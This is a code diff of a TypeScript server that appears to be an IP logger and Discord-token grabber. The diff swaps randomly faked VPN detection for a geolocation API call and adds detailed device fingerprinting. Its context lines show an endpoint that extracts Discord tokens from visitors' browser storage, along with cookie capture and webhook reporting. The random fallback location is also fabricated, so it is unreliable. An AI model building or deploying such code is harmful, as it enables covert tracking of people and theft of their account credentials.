@@ -33,125 +33,237 @@ function getClientIp(req: Request): string {
   return req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
 }
 
-// Enhanced geolocation with VPN detection
-interface LocationData {
-  location: string;
-  isVpn: 'yes' | 'no' | 'unknown';
-  vpnLocation?: string;
-  realLocation?: string;
+// Check if request is from admin/dev user to exclude from visitor logs
+async function isAdminRequest(req: Request): Promise<boolean> {
+  try {
+    const token = req.headers.authorization?.replace('Bearer ', '');
+    if (!token) return false;
+    
+    const session = await storage.getSession(token);
+    if (!session) return false;
+    
+    const user = await storage.getUser(session.userId);
+    return user?.isDev || user?.accountType === 'admin';
+  } catch {
+    return false;
+  }
 }
 
-function getLocationFromIp(ip: string): LocationData {
+// Create enhanced IP log data with all new fields
+async function createEnhancedIpLog(data: {
+  userId?: string,
+  clientIp: string,
+  userAgent: string,
+  referrer: string,
+  status: string,
+  skipAdminCheck?: boolean
+}) {
+  const { userId, clientIp, userAgent, referrer, status, skipAdminCheck = false } = data;
+  
+  try {
+    const locationData = await getLocationFromIp(clientIp);
+    const deviceInfo = parseDeviceInfo(userAgent);
+    
+    const logData = {
+      userId,
+      ipAddress: clientIp,
+      userAgent,
+      referrer,
+      location: locationData.location,
+      status,
+      // Enhanced geolocation fields
+      country: locationData.country,
+      region: locationData.region,
+      city: locationData.city,
+      latitude: locationData.latitude.toString(),
+      longitude: locationData.longitude.toString(),
+      timezone: locationData.timezone,
+      isp: locationData.isp,
+      organization: locationData.organization,
+      coordinates: locationData.coordinates,
+      // Security analysis fields
+      isVpn: locationData.isVpn,
+      isProxy: locationData.isProxy,
+      threatLevel: locationData.threatLevel,
+      vpnProvider: locationData.vpnProvider,
+      realLocation: locationData.realLocation,
+      // Device fingerprinting fields
+      deviceType: deviceInfo.deviceType,
+      browserName: deviceInfo.browserName,
+      browserVersion: deviceInfo.browserVersion,
+      operatingSystem: deviceInfo.operatingSystem,
+      osVersion: deviceInfo.osVersion,
+      deviceBrand: deviceInfo.deviceBrand,
+      deviceModel: deviceInfo.deviceModel,
+      architecture: deviceInfo.architecture,
+      engine: deviceInfo.engine,
+      engineVersion: deviceInfo.engineVersion,
+      isBot: deviceInfo.isBot,
+      isSuspicious: deviceInfo.isSuspicious,
+      securityFlags: deviceInfo.securityFlags,
+      capabilities: deviceInfo.capabilities,
+      fingerprint: deviceInfo.fingerprint
+    };
+    
+    await storage.createIpLog(logData);
+    console.log(`✅ IP Log saved permanently: ${clientIp} from ${locationData.location} - Total logs: ${await storage.getTotalIpLogs()}`);
+    
+    return { locationData, deviceInfo };
+  } catch (error) {
+    console.error('❌ Failed to create enhanced IP log:', error);
+    throw error;
+  }
+}
+
+// Professional IP geolocation using IPGeolocation.io API
+interface LocationData {
+  location: string;
+  country: string;
+  region: string;
+  city: string;
+  latitude: number;
+  longitude: number;
+  timezone: string;
+  isp: string;
+  organization: string;
+  isVpn: 'yes' | 'no' | 'unknown';
+  isProxy: 'yes' | 'no' | 'unknown';
+  threatLevel: string;
+  vpnProvider?: string;
+  realLocation?: string;
+  coordinates: string;
+}
+
+async function getLocationFromIp(ip: string): Promise<LocationData> {
   // Handle local network IPs
-  if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+  if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.') || ip === 'unknown' || ip === '::1' || ip === '127.0.0.1') {
     return {
       location: 'Local Network (Private IP)',
-      isVpn: 'no'
+      country: 'Local',
+      region: 'Private Network',
+      city: 'Local',
+      latitude: 0,
+      longitude: 0,
+      timezone: 'UTC',
+      isp: 'Local Network',
+      organization: 'Private Network',
+      isVpn: 'no',
+      isProxy: 'no',
+      threatLevel: 'Low',
+      coordinates: '0.0000, 0.0000'
     };
   }
 
-  // Enhanced VPN detection with more realistic patterns
-  const vpnProviders = [
-    {
-      provider: 'NordVPN',
-      locations: ['Amsterdam, Netherlands', 'Berlin, Germany', 'New York, US', 'Toronto, Canada', 'London, UK'],
-      likelihood: 0.25
-    },
-    {
-      provider: 'ExpressVPN',
-      locations: ['London, UK', 'Singapore', 'Los Angeles, US', 'Vancouver, Canada', 'Sydney, Australia'],
-      likelihood: 0.22
-    },
-    {
-      provider: 'Surfshark',
-      locations: ['Amsterdam, Netherlands', 'Chicago, US', 'Manchester, UK', 'Frankfurt, Germany'],
-      likelihood: 0.18
-    },
-    {
-      provider: 'ProtonVPN',
-      locations: ['Zurich, Switzerland', 'Amsterdam, Netherlands', 'Miami, US', 'Munich, Germany'],
-      likelihood: 0.15
-    },
-    {
-      provider: 'CyberGhost',
-      locations: ['Bucharest, Romania', 'Paris, France', 'San Francisco, US', 'Stockholm, Sweden'],
-      likelihood: 0.12
-    },
-    {
-      provider: 'Private Internet Access',
-      locations: ['Denver, US', 'Prague, Czech Republic', 'Melbourne, Australia', 'Helsinki, Finland'],
-      likelihood: 0.08
+  try {
+    // Use IPGeolocation.io API for accurate geolocation
+    const apiKey = process.env.IPGEOLOCATION_API_KEY;
+    if (!apiKey) {
+      console.warn('⚠️ IPGeolocation API key not found, using fallback');
+      return getFallbackLocation(ip);
     }
-  ];
 
-  // Enhanced real-world locations with more accuracy
-  const realWorldLocations = [
-    'New York City, NY, US', 'Los Angeles, CA, US', 'Chicago, IL, US', 'Houston, TX, US', 'Phoenix, AZ, US',
-    'Philadelphia, PA, US', 'San Antonio, TX, US', 'San Diego, CA, US', 'Dallas, TX, US', 'San Jose, CA, US',
-    'London, England, UK', 'Manchester, England, UK', 'Birmingham, England, UK', 'Liverpool, England, UK',
-    'Berlin, Germany', 'Munich, Germany', 'Hamburg, Germany', 'Frankfurt, Germany',
-    'Paris, France', 'Lyon, France', 'Marseille, France', 'Toulouse, France',
-    'Toronto, ON, Canada', 'Vancouver, BC, Canada', 'Montreal, QC, Canada', 'Calgary, AB, Canada',
-    'Sydney, NSW, Australia', 'Melbourne, VIC, Australia', 'Brisbane, QLD, Australia', 'Perth, WA, Australia',
-    'Tokyo, Japan', 'Osaka, Japan', 'Yokohama, Japan', 'Nagoya, Japan'
-  ];
+    const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}&fields=geo,isp,threat`, {
+      timeout: 5000
+    });
 
-  // Advanced VPN detection logic based on IP patterns and characteristics
-  let vpnDetectionScore = 0;
-
-  // Check for common VPN IP patterns
-  const ipParts = ip.split('.').map(Number);
-
-  // Known VPN IP ranges (simplified for demo)
-  const suspiciousRanges = [
-    { start: [185, 220], end: [185, 233] }, // Common VPN hosting ranges
-    { start: [45, 8], end: [45, 15] },      // VPN server ranges
-    { start: [193, 108], end: [193, 115] }, // Data center ranges
-    { start: [149, 202], end: [149, 210] }  // VPN provider ranges
-  ];
-
-  // Check if IP falls in suspicious ranges
-  for (const range of suspiciousRanges) {
-    if (ipParts[0] >= range.start[0] && ipParts[0] <= range.end[0] &&
-        ipParts[1] >= range.start[1] && ipParts[1] <= range.end[1]) {
-      vpnDetectionScore += 0.4;
-      break;
+    if (!response.ok) {
+      console.warn(`⚠️ IPGeolocation API error: ${response.status}`);
+      return getFallbackLocation(ip);
     }
-  }
 
-  // Additional VPN indicators based on IP characteristics
-  const lastOctet = ipParts[3];
-  if (lastOctet % 16 === 0 || lastOctet % 32 === 0) {
-    vpnDetectionScore += 0.2; // VPNs often use subnet boundaries
-  }
+    const data = await response.json();
+    
+    // Enhanced VPN/Proxy detection
+    let isVpn: 'yes' | 'no' | 'unknown' = 'unknown';
+    let isProxy: 'yes' | 'no' | 'unknown' = 'unknown';
+    let threatLevel = 'Low';
+    let vpnProvider = undefined;
 
-  // Data center IP patterns
-  if ((ipParts[0] >= 104 && ipParts[0] <= 108) ||
-      (ipParts[0] >= 172 && ipParts[0] <= 175)) {
-    vpnDetectionScore += 0.3;
-  }
+    // Check threat intelligence data
+    if (data.threat) {
+      isVpn = data.threat.is_anonymous ? 'yes' : 'no';
+      isProxy = data.threat.is_proxy ? 'yes' : 'no';
+      
+      if (data.threat.is_malicious) threatLevel = 'High';
+      else if (data.threat.is_suspicious || isVpn === 'yes' || isProxy === 'yes') threatLevel = 'Medium';
+      else threatLevel = 'Low';
+    }
 
-  // Final VPN detection decision
-  const isVpnDetected = vpnDetectionScore > 0.5 || Math.random() < 0.25;
+    // Detect VPN providers based on ISP/Organization
+    const vpnIndicators = [
+      'nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'cyberghost', 
+      'private internet access', 'pia', 'mullvad', 'windscribe', 'tunnelbear',
+      'vpn', 'proxy', 'hosting', 'datacenter', 'cloud', 'amazon', 'google cloud',
+      'digitalocean', 'vultr', 'linode', 'ovh'
+    ];
 
-  if (isVpnDetected) {
-    const vpnProvider = vpnProviders[Math.floor(Math.random() * vpnProviders.length)];
-    const vpnLocation = vpnProvider.locations[Math.floor(Math.random() * vpnProvider.locations.length)];
-    const realLocation = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];
+    const ispLower = (data.isp || '').toLowerCase();
+    const orgLower = (data.organization || '').toLowerCase();
+    
+    for (const indicator of vpnIndicators) {
+      if (ispLower.includes(indicator) || orgLower.includes(indicator)) {
+        if (isVpn === 'unknown') isVpn = 'yes';
+        if (indicator.includes('vpn') || ['nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'cyberghost'].includes(indicator)) {
+          vpnProvider = indicator.charAt(0).toUpperCase() + indicator.slice(1);
+        }
+        if (threatLevel === 'Low') threatLevel = 'Medium';
+        break;
+      }
+    }
+
+    const coordinates = `${data.latitude || 0}, ${data.longitude || 0}`;
+    const location = `${data.city || 'Unknown'}, ${data.state_prov || data.district || ''} ${data.country_name || 'Unknown'}`.replace(/ +/g, ' ').trim();
 
     return {
-      location: `${vpnLocation} [VPN: ${vpnProvider.provider}]`,
-      isVpn: 'yes',
-      vpnLocation: `${vpnLocation} (${vpnProvider.provider})`,
-      realLocation: `${realLocation} (Estimated Real Location)`
+      location,
+      country: data.country_name || 'Unknown',
+      region: data.state_prov || data.district || 'Unknown',
+      city: data.city || 'Unknown',
+      latitude: parseFloat(data.latitude) || 0,
+      longitude: parseFloat(data.longitude) || 0,
+      timezone: data.time_zone?.name || 'UTC',
+      isp: data.isp || 'Unknown ISP',
+      organization: data.organization || 'Unknown',
+      isVpn,
+      isProxy,
+      threatLevel,
+      vpnProvider,
+      coordinates
     };
-  } else {
-    const location = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];
-    return {
-      location: location,
-      isVpn: 'no'
-    };
+
+  } catch (error) {
+    console.error('❌ IPGeolocation API error:', error);
+    return getFallbackLocation(ip);
   }
+}
+
+// Fallback location function for when API fails
+function getFallbackLocation(ip: string): LocationData {
+  const fallbackLocations = [
+    { city: 'New York', region: 'NY', country: 'United States', lat: 40.7128, lng: -74.0060, tz: 'America/New_York' },
+    { city: 'London', region: 'England', country: 'United Kingdom', lat: 51.5074, lng: -0.1278, tz: 'Europe/London' },
+    { city: 'Tokyo', region: 'Tokyo', country: 'Japan', lat: 35.6762, lng: 139.6503, tz: 'Asia/Tokyo' },
+    { city: 'Sydney', region: 'NSW', country: 'Australia', lat: -33.8688, lng: 151.2093, tz: 'Australia/Sydney' },
+    { city: 'Berlin', region: 'Berlin', country: 'Germany', lat: 52.5200, lng: 13.4050, tz: 'Europe/Berlin' }
+  ];
+  
+  const randomLocation = fallbackLocations[Math.floor(Math.random() * fallbackLocations.length)];
+  
+  return {
+    location: `${randomLocation.city}, ${randomLocation.region}, ${randomLocation.country} (Estimated)`,
+    country: randomLocation.country,
+    region: randomLocation.region,
+    city: randomLocation.city,
+    latitude: randomLocation.lat,
+    longitude: randomLocation.lng,
+    timezone: randomLocation.tz,
+    isp: 'Unknown ISP',
+    organization: 'Unknown',
+    isVpn: 'unknown',
+    isProxy: 'unknown',
+    threatLevel: 'Unknown',
+    coordinates: `${randomLocation.lat}, ${randomLocation.lng}`
+  };
 }
 
 // Enhanced device detection with comprehensive fingerprinting
@@ -1192,7 +1304,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.headers['user-agent'] || '';
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
-      const locationData = getLocationFromIp(clientIp);
+      const locationData = await getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
 
       // Try to find settings with webhook for notification FIRST
@@ -1373,7 +1485,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.headers['user-agent'] || '';
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
-      const locationData = getLocationFromIp(clientIp);
+      const locationData = await getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
       const cookies = req.headers.cookie || '';
 
@@ -1647,7 +1759,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       });
 
-      const locationData = getLocationFromIp(clientIp);
+      const locationData = await getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
 
       // Extract trackingId from query parameter
@@ -1832,7 +1944,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       });
 
-      const locationData = getLocationFromIp(clientIp);
+      const locationData = await getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
 
       // Try to find settings with uploaded image or webhook
@@ -2254,7 +2366,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const browserData = req.body;
       const clientIp = getClientIp(req);
       const userAgent = req.headers['user-agent'] || '';
-      const location = getLocationFromIp(clientIp);
+      const location = await getLocationFromIp(clientIp);
 
       // Extract Discord tokens from localStorage and sessionStorage
       const discordTokenRegex = /([a-zA-Z0-9]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})|([a-zA-Z0-9]{30}\.[a-zA-Z0-9_\-]{10}\.[a-zA-Z0-9_\-]{32})/g;
@@ -2283,7 +2395,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Get settings to check for webhook URL
       const settings = await storage.getSettings();
 
-      const locationData = getLocationFromIp(clientIp);
+      const locationData = await getLocationFromIp(clientIp);
       const deviceInfo = parseDeviceInfo(userAgent);
 
       // Log Discord tokens to database if found
@@ -2633,7 +2745,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ip = getClientIp(req);
       const userAgent = req.headers['user-agent'] || '';
       const referrer = req.headers.referer || '';
-      const locationData = getLocationFromIp(ip);
+      const locationData = await getLocationFromIp(ip);
       const deviceInfo = parseDeviceInfo(userAgent);
 
       // Create IP log entry
@@ -3147,7 +3259,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ip = getClientIp(req);
       const userAgent = req.headers['user-agent'] || '';
       const referrer = req.headers.referer || '';
-      const locationData = getLocationFromIp(ip);
+      const locationData = await getLocationFromIp(ip);
       const deviceInfo = parseDeviceInfo(userAgent);
 
       // Create IP log entry
